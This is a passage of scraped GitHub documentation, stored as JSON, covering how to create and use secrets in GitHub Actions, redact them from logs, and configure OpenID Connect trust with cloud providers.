        "text": "For information on how to configure Dependabot version updates, seeConfiguring Dependabot version updates."
      },
      {
        "type": "paragraph",
        "text": "For information on how to configure Dependabot security updates, seeConfiguring Dependabot security updates."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Protecting actions you've created"
      },
      {
        "type": "paragraph",
        "text": "GitHub enables collaboration between people who publish and maintain actions and vulnerability reporters in order to promote secure coding. Repository security advisories allow maintainers of public repositories to privately discuss and fix a security vulnerability in a project. After collaborating on a fix, repository maintainers can publish the security advisory to publicly disclose the security vulnerability to the project's community. By publishing security advisories, repository maintainers make it easier for their community to update package dependencies and research the impact of the security vulnerabilities."
      },
      {
        "type": "paragraph",
        "text": "If you are someone who maintains an action that is used in other projects, you can use the following GitHub features to enhance the security of the actions you've published."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Use the dependants view in the Dependency graph to see which projects depend on your code. If you receive a vulnerability report, this will give you an idea of who you need to communicate with about the vulnerability and how to fix it. For more information, seeExploring the dependencies of a repository.",
          "Use repository security advisories to create a security advisory, privately collaborate to fix the vulnerability in a temporary private fork, and publish a security advisory to alert your community of the vulnerability once a patch is released. For more information, seeConfiguring private vulnerability reporting for a repositoryandCreating a repository security advisory."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions",
    "content": [
      {
        "type": "paragraph",
        "text": "For general information about secrets, seeAbout secrets."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating secrets for a repository"
      },
      {
        "type": "paragraph",
        "text": "To create secrets or variables on GitHub for a personal account repository, you must be the repository owner. To create secrets or variables on GitHub for an organization repository, you must haveadminaccess. Lastly, to create secrets or variables for a personal account repository or an organization repository through the REST API, you must have collaborator access."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the \"Security\" section of the sidebar, selectSecrets and variables, then clickActions.",
          "Click theSecretstab.",
          "ClickNew repository secret.",
          "In theNamefield, type a name for your secret.",
          "In theSecretfield, enter the value for your secret.",
          "ClickAdd secret."
        ]
      },
      {
        "type": "paragraph",
        "text": "If your repository has environment secrets or can access secrets from the parent organization, then those secrets are also listed on this page."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "To add a repository secret, use thegh secret setsubcommand. Replacesecret-namewith the name of your secret."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret set SECRET_NAME"
      },
      {
        "type": "paragraph",
        "text": "The CLI will prompt you to enter a secret value. Alternatively, you can read the value of the secret from a file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret set SECRET_NAME < secret.txt"
      },
      {
        "type": "paragraph",
        "text": "To list all secrets for the repository, use thegh secret listsubcommand."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating secrets for an environment"
      },
      {
        "type": "paragraph",
        "text": "To create secrets or variables for an environment in a personal account repository, you must be the repository owner. To create secrets or variables for an environment in an organization repository, you must haveadminaccess. For more information on environments, seeManaging environments for deployment."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickEnvironments.",
          "Click on the environment that you want to add a secret to.",
          "UnderEnvironment secrets, clickAdd secret.",
          "Type a name for your secret in theNameinput box.",
          "Enter the value for your secret.",
          "ClickAdd secret."
        ]
      },
      {
        "type": "paragraph",
        "text": "To add a secret for an environment, use thegh secret setsubcommand with the--envor-eflag followed by the environment name."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret set --env ENV_NAME SECRET_NAME"
      },
      {
        "type": "paragraph",
        "text": "To list all secrets for an environment, use thegh secret listsubcommand with the--envor-eflag followed by the environment name."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret list --env ENV_NAME"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating secrets for an organization"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Organization-level secrets and variables are not accessible by private repositories for GitHub Free. For more information about upgrading your GitHub subscription, seeUpgrading your account's plan."
      },
      {
        "type": "paragraph",
        "text": "When creating a secret or variable in an organization, you can use a policy to limit access by repository. For example, you can grant access to all repositories, or limit access to only private repositories or a specified list of repositories."
      },
      {
        "type": "paragraph",
        "text": "Organization owners can create secrets or variables at the organization level."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the \"Security\" section of the sidebar, selectSecrets and variables, then clickActions.",
          "Click theSecretstab.",
          "ClickNew organization secret.",
          "Type a name for your secret in theNameinput box.",
          "Enter theValuefor your secret.",
          "From theRepository accessdropdown list, choose an access policy.",
          "ClickAdd secret."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub CLI authenticates with therepoandread:orgscopes. To manage organization secrets, you must additionally authorize theadmin:orgscope."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh auth login --scopes \"admin:org\""
      },
      {
        "type": "paragraph",
        "text": "To add a secret for an organization, use thegh secret setsubcommand with the--orgor-oflag followed by the organization name."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret set --org ORG_NAME SECRET_NAME"
      },
      {
        "type": "paragraph",
        "text": "By default, the secret is only available to private repositories. To specify that the secret should be available to all repositories within the organization, use the--visibilityor-vflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret set --org ORG_NAME SECRET_NAME --visibility all"
      },
      {
        "type": "paragraph",
        "text": "To specify that the secret should be available to selected repositories within the organization, use the--reposor-rflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret set --org ORG_NAME SECRET_NAME --repos REPO-NAME-1, REPO-NAME-2"
      },
      {
        "type": "paragraph",
        "text": "To list all secrets for an organization, use thegh secret listsubcommand with the--orgor-oflag followed by the organization name."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh secret list --org ORG_NAME"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reviewing access to organization-level secrets"
      },
      {
        "type": "paragraph",
        "text": "You can check which access policies are being applied to a secret in your organization."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the \"Security\" section of the sidebar, selectSecrets and variables, then clickActions.",
          "The list of secrets includes any configured permissions and policies. For more details about the configured permissions for each secret, clickUpdate."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using secrets in a workflow"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "With the exception ofGITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository.",
          "Secrets are not automatically passed to reusable workflows. For more information, seeReusing workflows.\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "paragraph",
        "text": "To provide an action with a secret as an input or environment variable, you can use thesecretscontext to access secrets you've created in your repository. For more information, seeAccessing contextual information about workflow runsandWorkflow syntax for GitHub Actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Hello world action\n    with: # Set the secret as an input\n      super_secret: ${{ secrets.SuperSecret }}\n    env: # Or as an environment variable\n      super_secret: ${{ secrets.SuperSecret }}"
      },
      {
        "type": "paragraph",
        "text": "Secrets cannot be directly referenced inif:conditionals. Instead, consider setting secrets as job-level environment variables, then referencing the environment variables to conditionally run steps in the job. For more information, seeAccessing contextual information about workflow runsandjobs.<job_id>.steps[*].if."
      },
      {
        "type": "paragraph",
        "text": "If a secret has not been set, the return value of an expression referencing the secret (such as${{ secrets.SuperSecret }}in the example) will be an empty string."
      },
      {
        "type": "paragraph",
        "text": "Avoid passing secrets between processes from the command line, whenever possible. Command-line processes may be visible to other users (using thepscommand) or captured bysecurity audit events. To help protect secrets, consider using environment variables,STDIN, or other mechanisms supported by the target process."
      },
      {
        "type": "paragraph",
        "text": "If you must pass secrets within a command line, then enclose them within the proper quoting rules. Secrets often contain special characters that may unintentionally affect your shell. To escape these special characters, use quoting with your environment variables. For example:"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using Bash"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - shell: bash\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"$SUPER_SECRET\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using PowerShell"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - shell: pwsh\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"$env:SUPER_SECRET\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using Cmd.exe"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - shell: cmd\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"%SUPER_SECRET%\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Limits for secrets"
      },
      {
        "type": "paragraph",
        "text": "You can store up to 1,000 organization secrets, 100 repository secrets, and 100 environment secrets."
      },
      {
        "type": "paragraph",
        "text": "A workflow created in a repository can access the following number of secrets:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "All 100 repository secrets.",
          "If the repository is assigned access to more than 100 organization secrets, the workflow can only use the first 100 organization secrets (sorted alphabetically by secret name).",
          "All 100 environment secrets."
        ]
      },
      {
        "type": "paragraph",
        "text": "Secrets are limited to 48 KB in size. To store larger secrets, see theStoring large secretsworkaround below."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Storing large secrets"
      },
      {
        "type": "paragraph",
        "text": "To use secrets that are larger than 48 KB, you can use a workaround to store secrets in your repository and save the decryption passphrase as a secret on GitHub. For example, you can usegpgto encrypt a file containing your secret locally before checking the encrypted file in to your repository on GitHub. For more information, see thegpg manpage."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Be careful that your secrets do not get printed when your workflow runs. When using this workaround, GitHub does not redact secrets that are printed in logs."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Run the following command from your terminal to encrypt the file containing your secret usinggpgand the AES256 cipher algorithm. In this example,my_secret.jsonis the file containing the secret.gpg --symmetric --cipher-algo AES256 my_secret.json",
          "You will be prompted to enter a passphrase. Remember the passphrase, because you'll need to create a new secret on GitHub that uses the passphrase as the value.",
          "Create a new secret that contains the passphrase. For example, create a new secret with the nameLARGE_SECRET_PASSPHRASEand set the value of the secret to the passphrase you used in the step above.",
          "Copy your encrypted file to a path in your repository and commit it. In this example, the encrypted file ismy_secret.json.gpg.WarningMake sure to copy the encryptedmy_secret.json.gpgfile ending with the.gpgfile extension, andnotthe unencryptedmy_secret.jsonfile.git add my_secret.json.gpg\ngit commit -m \"Add new secret JSON file\"",
          "Create a shell script in your repository to decrypt the secret file. In this example, the script is nameddecrypt_secret.sh.Shell#!/bin/sh\n\n# Decrypt the file\nmkdir $HOME/secrets\n# --batch to prevent interactive command\n# --yes to assume \"yes\" for questions\ngpg --quiet --batch --yes --decrypt --passphrase=\"$LARGE_SECRET_PASSPHRASE\" \\\n--output $HOME/secrets/my_secret.json my_secret.json.gpg#!/bin/sh#Decrypt the filemkdir $HOME/secrets#--batch to prevent interactivecommand#--yesto assume\"yes\"forquestionsgpg --quiet --batch --yes --decrypt --passphrase=\"$LARGE_SECRET_PASSPHRASE\" \\\n--output $HOME/secrets/my_secret.json my_secret.json.gpg",
          "Ensure your shell script is executable before checking it in to your repository.chmod +x decrypt_secret.sh\ngit add decrypt_secret.sh\ngit commit -m \"Add new decryption script\"\ngit push",
          "In your GitHub Actions workflow, use astepto call the shell script and decrypt the secret. To have a copy of your repository in the environment that your workflow runs in, you'll need to use theactions/checkoutaction. Reference your shell script using theruncommand relative to the root of your repository.name:Workflowswithlargesecretson:pushjobs:my-job:name:MyJobruns-on:ubuntu-lateststeps:-uses:actions/checkout@v4-name:Decryptlargesecretrun:./decrypt_secret.shenv:LARGE_SECRET_PASSPHRASE:${{secrets.LARGE_SECRET_PASSPHRASE}}# This command is just an example to show your secret being printed# Ensure you remove any print statements of your secrets. GitHub does# not hide secrets that use this workaround.-name:Testprintingyoursecret(Removethisstepinproduction)run:cat$HOME/secrets/my_secret.json"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Storing Base64 binary blobs as secrets"
      },
      {
        "type": "paragraph",
        "text": "You can use Base64 encoding to store small binary blobs as secrets. You can then reference the secret in your workflow and decode it for use on the runner. For the size limits, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Note that Base64 only converts binary to text, and is not a substitute for actual encryption."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Usebase64to encode your file into a Base64 string. For example:On macOS, you could run:base64 -i cert.der -o cert.base64On Linux, you could run:base64 -w 0 cert.der > cert.base64",
          "Create a secret that contains the Base64 string. For example:$gh secretsetCERTIFICATE_BASE64 < cert.base64✓ Set secret CERTIFICATE_BASE64 for octocat/octorepo",
          "To access the Base64 string from your runner, pipe the secret tobase64 --decode. For example:name:RetrieveBase64secreton:push:branches:[octo-branch]jobs:decode-secret:runs-on:ubuntu-lateststeps:-uses:actions/checkout@v4-name:Retrievethesecretanddecodeittoafileenv:CERTIFICATE_BASE64:${{secrets.CERTIFICATE_BASE64}}run:|\n          echo $CERTIFICATE_BASE64 | base64 --decode > cert.der-name:Showcertificateinformationrun:|\n          openssl x509 -in cert.der -inform DER -text -noout"
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Using another shell might require different commands for decoding the secret to a file. On Windows runners, we recommendusing a bash shellwithshell: bashto use the commands in therunstep above."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Redacting secrets from workflow run logs"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions automatically redacts the contents of all GitHub secrets that are printed to workflow logs."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions also redacts information that is recognized as sensitive, but is not stored as a secret. Currently GitHub supports the following:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "32-byte and 64-byte Azure keys",
          "Azure AD client app passwords",
          "Azure Cache keys",
          "Azure Container Registry keys",
          "Azure Function host keys",
          "Azure Search keys",
          "Database connection strings",
          "HTTP Bearer token headers",
          "JWTs",
          "NPM author tokens",
          "NuGet API keys",
          "v1 GitHub installation tokens",
          "v2 GitHub installation tokens (ghp,gho,ghu,ghs,ghr)",
          "v2 GitHub PATs"
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you would like other types of sensitive information to be automatically redacted, please reach out to us in ourcommunity discussions."
      },
      {
        "type": "paragraph",
        "text": "As a habit of best practice, you should mask all sensitive information that is not a GitHub secret by using::add-mask::VALUE. This causes the value to be treated as a secret and redacted from logs. For more information about masking data, seeWorkflow commands for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Redacting of secrets is performed by your workflow runners. This means a secret will only be redacted if it was used within a job and is accessible by the runner. If an unredacted secret is sent to a workflow run log, you should delete the log and rotate the secret. For information on deleting logs, seeUsing workflow run logs."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview of OpenID Connect"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions workflows are often designed to access a cloud provider (such as AWS, Azure, GCP, or HashiCorp Vault) in order to deploy software or use the cloud's services. Before the workflow can access these resources, it will supply credentials, such as a password or token, to the cloud provider. These credentials are usually stored as a secret in GitHub, and the workflow presents this secret to the cloud provider every time it runs."
      },
      {
        "type": "paragraph",
        "text": "However, using hardcoded secrets requires you to create credentials in the cloud provider and then duplicate them in GitHub as a secret."
      },
      {
        "type": "paragraph",
        "text": "With OpenID Connect (OIDC), you can take a different approach by configuring your workflow to request a short-lived access token directly from the cloud provider. Your cloud provider also needs to support OIDC on their end, and you must configure a trust relationship that controls which workflows are able to request the access tokens. Providers that currently support OIDC include Amazon Web Services, Azure, Google Cloud Platform, and HashiCorp Vault, among others."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Benefits of using OIDC"
      },
      {
        "type": "paragraph",
        "text": "By updating your workflows to use OIDC tokens, you can adopt the following good security practices:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "No cloud secrets:You won't need to duplicate your cloud credentials as long-lived GitHub secrets. Instead, you can configure the OIDC trust on your cloud provider, and then update your workflows to request a short-lived access token from the cloud provider through OIDC.",
          "Authentication and authorization management:You have more granular control over how workflows can use credentials, using your cloud provider's authentication (authN) and authorization (authZ) tools to control access to cloud resources.",
          "Rotating credentials:With OIDC, your cloud provider issues a short-lived access token that is only valid for a single job, and then automatically expires."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Getting started with OIDC"
      },
      {
        "type": "paragraph",
        "text": "The following diagram gives an overview of how GitHub's OIDC provider integrates with your workflows and cloud provider:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In your cloud provider, create an OIDC trust between your cloud role and your GitHub workflow(s) that need access to the cloud.",
          "Every time your job runs, GitHub's OIDC Provider auto-generates an OIDC token. This token contains multiple claims to establish a security-hardened and verifiable identity about the specific workflow that is trying to authenticate.",
          "You could include a step or action in your job to request this token from GitHub's OIDC provider, and present it to the cloud provider.",
          "Once the cloud provider successfully validates the claims presented in the token, it then provides a short-lived cloud access token that is available only for the duration of the job."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring the OIDC trust with the cloud"
      },
      {
        "type": "paragraph",
        "text": "When you configure your cloud to trust GitHub's OIDC provider, youmustadd conditions that filter incoming requests, so that untrusted repositories or workflows can’t request access tokens for your cloud resources:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Before granting an access token, your cloud provider checks that thesubjectand other claims used to set conditions in its trust settings match those in the request's JSON Web Token (JWT). As a result, you must take care to correctly define thesubjectand other conditions in your cloud provider.",
          "The OIDC trust configuration steps and the syntax to set conditions for cloud roles (usingSubjectand other claims) will vary depending on which cloud provider you're using. For some examples, seeExample subject claims."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Understanding the OIDC token"
      },
      {
        "type": "paragraph",
        "text": "Each job requests an OIDC token from GitHub's OIDC provider, which responds with an automatically generated JSON web token (JWT) that is unique for each workflow job where it is generated. When the job runs, the OIDC token is presented to the cloud provider. To validate the token, the cloud provider checks if the OIDC token's subject and other claims are a match for the conditions that were preconfigured on the cloud role's OIDC trust definition."
      },
      {
        "type": "paragraph",
        "text": "The following example OIDC token uses a subject (sub) that references a job environment namedprodin theocto-org/octo-reporepository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"x5t\": \"example-thumbprint\",\n  \"kid\": \"example-key-id\"\n}\n{\n  \"jti\": \"example-id\",\n  \"sub\": \"repo:octo-org/octo-repo:environment:prod\",\n  \"environment\": \"prod\",\n  \"aud\": \"https://github.com/octo-org\",\n  \"ref\": \"refs/heads/main\",\n  \"sha\": \"example-sha\",\n  \"repository\": \"octo-org/octo-repo\",\n  \"repository_owner\": \"octo-org\",\n  \"actor_id\": \"12\",\n  \"repository_visibility\": \"private\",\n  \"repository_id\": \"74\",\n  \"repository_owner_id\": \"65\",\n  \"run_id\": \"example-run-id\",\n  \"run_number\": \"10\",\n  \"run_attempt\": \"2\",\n  \"runner_environment\": \"github-hosted\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"example-workflow\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"workflow_dispatch\",\n  \"ref_type\": \"branch\",\n  \"job_workflow_ref\": \"octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\",\n  \"iss\": \"https://token.actions.githubusercontent.com\",\n  \"nbf\": 1632492967,\n  \"exp\": 1632493867,\n  \"iat\": 1632493567\n}"
      },
      {
        "type": "paragraph",
        "text": "To see all the claims supported by GitHub's OIDC provider, review theclaims_supportedentries athttps://token.actions.githubusercontent.com/.well-known/openid-configuration."
      },
      {
        "type": "paragraph",
        "text": "The token includes the standard audience, issuer, and subject claims."
      },
      {
        "type": "paragraph",
        "text": "The OIDC token also includes additional standard JOSE header parameters and claims."
      },
      {
        "type": "paragraph",
        "text": "The token also includes custom claims provided by GitHub."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Defining trust conditions on cloud roles using OIDC claims"
      },
      {
        "type": "paragraph",
        "text": "With OIDC, a GitHub Actions workflow requires a token in order to access resources in your cloud provider. The workflow requests an access token from your cloud provider, which checks the details presented by the JWT. If the trust configuration in the JWT is a match, your cloud provider responds by issuing a temporary token to the workflow, which can then be used to access resources in your cloud provider. You can configure your cloud provider to only respond to requests that originate from a specific organization's repository. You can also specify additional conditions, described below."
      },
      {
        "type": "paragraph",
        "text": "Audience and Subject claims are typically used in combination while setting conditions on the cloud role/resources to scope its access to the GitHub workflows."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Audience:By default, this value uses the URL of the organization or repository owner. This can be used to set a condition that only the workflows in the specific organization can access the cloud role.",
          "Subject:By default, has a predefined format and is a concatenation of some of the key metadata about the workflow, such as the GitHub organization, repository, branch, or associatedjobenvironment. SeeExample subject claimsto see how the subject claim is assembled from concatenated metadata."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need more granular trust conditions, you can customize the subject (sub) claim that's included with the JWT. For more information, seeCustomizing the token claims."
      },
      {
        "type": "paragraph",
        "text": "There are also many additional claims supported in the OIDC token that can be used for setting these conditions. In addition, your cloud provider could allow you to assign a role to the access tokens, letting you specify even more granular permissions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example subject claims"
      },
      {
        "type": "paragraph",
        "text": "The following examples demonstrate how to use \"Subject\" as a condition, and explain how the \"Subject\" is assembled from concatenated metadata. Thesubjectuses information from thejobcontext, and instructs your cloud provider that access token requests may only be granted for requests from workflows running in specific branches, environments. The following sections describe some common subjects you can use."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Filtering for a specific environment"
      },
      {
        "type": "paragraph",
        "text": "The subject claim includes the environment name when the job references an environment."
      },
      {
        "type": "paragraph",
        "text": "You can configure a subject that filters for a specificenvironmentname. In this example, the workflow run must have originated from a job that has an environment namedProduction, in a repository namedocto-repothat is owned by theocto-orgorganization:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Syntax:repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME",
          "Example:repo:octo-org/octo-repo:environment:Production"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Filtering forpull_requestevents"
      },
      {
        "type": "paragraph",
        "text": "The subject claim includes thepull_requeststring when the workflow is triggered by a pull request event, but only if the job doesn't reference an environment."
      },
      {
        "type": "paragraph",
        "text": "You can configure a subject that filters for thepull_requestevent. In this example, the workflow run must have been triggered by apull_requestevent in a repository namedocto-repothat is owned by theocto-orgorganization:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Syntax:repo:ORG-NAME/REPO-NAME:pull_request",
          "Example:repo:octo-org/octo-repo:pull_request"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Filtering for a specific branch"
      },
      {
        "type": "paragraph",
        "text": "The subject claim includes the branch name of the workflow, but only if the job doesn't reference an environment, and if the workflow is not triggered by a pull request event."
      },
      {
        "type": "paragraph",
        "text": "You can configure a subject that filters for a specific branch name. In this example, the workflow run must have originated from a branch nameddemo-branch, in a repository namedocto-repothat is owned by theocto-orgorganization:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Syntax:repo:ORG-NAME/REPO-NAME:ref:refs/heads/BRANCH-NAME",
          "Example:repo:octo-org/octo-repo:ref:refs/heads/demo-branch"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Filtering for a specific tag"
      },
      {
        "type": "paragraph",
        "text": "The subject claim includes the tag name of the workflow, but only if the job doesn't reference an environment, and if the workflow is not triggered by a pull request event."
      },
      {
        "type": "paragraph",
        "text": "You can create a subject that filters for specific tag. In this example, the workflow run must have originated with a tag nameddemo-tag, in a repository namedocto-repothat is owned by theocto-orgorganization:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Syntax:repo:ORG-NAME/REPO-NAME:ref:refs/tags/TAG-NAME",
          "Example:repo:octo-org/octo-repo:ref:refs/tags/demo-tag"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the subject in your cloud provider"
      },
      {
        "type": "paragraph",
        "text": "To configure the subject in your cloud provider's trust relationship, you must add the subject string to its trust configuration. The following examples demonstrate how various cloud providers can accept the samerepo:octo-org/octo-repo:ref:refs/heads/demo-branchsubject in different ways:"
      },
      {
        "type": "paragraph",
        "text": "For more information, see the guides listed inEnabling OpenID Connect for your cloud provider."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your actions for OIDC"
      },
      {
        "type": "paragraph",
        "text": "To update your custom actions to authenticate using OIDC, you can usegetIDToken()from the Actions toolkit to request a JWT from GitHub's OIDC provider. For more information, see \"OIDC Token\" in thenpm package documentation."
      },
      {
        "type": "paragraph",
        "text": "You could also use acurlcommand to request the JWT, using the following environment variables."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "curl -H \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding permissions settings"
      },
      {
        "type": "paragraph",
        "text": "The job or workflow run requires apermissionssetting withid-token: writeto allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if thepermissionsforid-tokenis not set towrite, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Theid-token: writesetting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URLandACTIONS_ID_TOKEN_REQUEST_TOKEN).",
          "UsinggetIDToken()from the Actions toolkit."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout"
      },
      {
        "type": "paragraph",
        "text": "If you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT"
      },
      {
        "type": "paragraph",
        "text": "You may need to specify additional permissions here, depending on your workflow's requirements."
      },
      {
        "type": "paragraph",
        "text": "For reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context.\nFor reusable workflows outside your enterprise or organization, thepermissionssetting forid-tokenshould be explicitly set towriteat the caller workflow level or in the specific job that calls the reusable workflow.\nThis ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Customizing the token claims"
      },
      {
        "type": "paragraph",
        "text": "You can security harden your OIDC configuration by customizing the claims that are included with the JWT. These customizations allow you to define more granular trust conditions on your cloud roles when allowing your workflows to access resources hosted in the cloud:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You can customize values foraudienceclaims. SeeCustomizing theaudiencevalue.",
          "You can customize the format of your OIDC configuration by setting conditions on the subject (sub) claim that require JWT tokens to originate from a specific repository, reusable workflow, or other source.",
          "You can define granular OIDC policies by using additional OIDC token claims, such asrepository_idandrepository_visibility. SeeUnderstanding the OIDC token."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Customizing theaudiencevalue"
      },
      {
        "type": "paragraph",
        "text": "When you use custom actions in your workflows, those actions may use the GitHub Actions Toolkit to enable you to supply a custom value for theaudienceclaim. Some cloud providers also use this in their official login actions to enforce a default value for theaudienceclaim. For example, theGitHub Action for Azure Loginprovides a defaultaudvalue ofapi://AzureADTokenExchange, or it allows you to set a customaudvalue in your workflows. For more information on the GitHub Actions Toolkit, see theOIDC tokensection in the documentation."
      },
      {
        "type": "paragraph",
